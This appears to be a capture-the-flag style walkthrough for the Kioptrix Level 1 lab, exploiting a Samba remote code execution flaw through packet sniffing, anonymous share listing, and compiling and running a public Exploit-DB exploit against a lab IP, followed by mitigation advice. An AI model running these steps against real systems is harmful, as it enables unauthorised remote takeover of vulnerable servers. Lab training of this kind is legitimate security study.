# Samba < 2.2.8 (Linux/BSD)

## 🟢 Kioptrix Level 1

---

# 🎯 Exploit Summary

- 🔥 **Vulnerability** : Samba < 2.2.8 — Remote Code Execution
- 📌 **Exploit-DB** : EDB-ID 10
- 🌐 **Affected Protocol/Port** : SMB over NetBIOS (`TCP/139`)
- 💻 **Platform** : Linux/BSD

---

# 🚀 Testing and Exploitation Steps

---

# 🟣 1. Recon : Verify if Target is Running Samba

```bash
tcpdump -s0 -n -i eth0 src 192.168.1.174 and port 139 -A -c 10 2>/dev/null | grep -i "samba\|s.a.m"
```

---

## 🟡 Sample Output

```bash
..x$........C.SMBs....................d.............Unix.Samba 2.2.1a.MYGROUP.
........8......8................................................I.P.C.$........
.S.e.r.v.i.c.e...(S.a.m.b.a..S.e.r.v.e.r.)........A.D.M.I.N.$.................
```

---

## 🎯 Purpose

Sniffs traffic from the target IP on port `139` and filters packet contents for Samba-related strings.

---

## 💡 Use Case

Passive reconnaissance to confirm that Samba is running on the target system.

---

# 🟣 2. Enumerate SMB Shares

```bash
smbclient -L 192.168.1.174 --option='client min protocol=NT1' -N
```

---

## 🎯 Purpose

Lists available SMB shares without authentication using the `-N` option.

---

## ❓ Why NT1?

Samba 2.x supports SMB1 (`NT1`) only.

Modern SMB clients default to SMB2 or SMB3, so NT1 must be explicitly enabled for compatibility.

---

# 🟣 3. Compile the Exploit

```bash
gcc 10.c -o 10
```

---

## 📌 Details

- `10.c` refers to the public exploit source code from Exploit-DB (`EDB-ID 10`)
- The compiled binary output will be named `10`
- 🔗 `https://www.exploit-db.com/exploits/10`

---

# 🟣 4. Execute the Exploit

```bash
./10 -b 0 -v -p 139 192.168.1.174
```

---

## ⚙️ Parameters

| Parameter | Description |
| --- | --- |
| `-b 0` | Buffer number used by the exploit |
| `-v` | Verbose mode |
| `-p 139` | Target SMB port |
| `192.168.1.174` | Target IP address |

---

## 📝 Notes

Different environments may require testing multiple buffer values using the `-b` option.

In some cases, shellcode modifications may also be necessary.

# 🛡️ Mitigation

# ✅ Recommended Actions

- Upgrade Samba to version `2.2.8` or later
- Disable SMB1 where possible
- Restrict access to TCP ports `139` and `445` using firewall rules
- Monitor SMB traffic for suspicious authentication or exploitation attempts
- Segment legacy systems from production networks
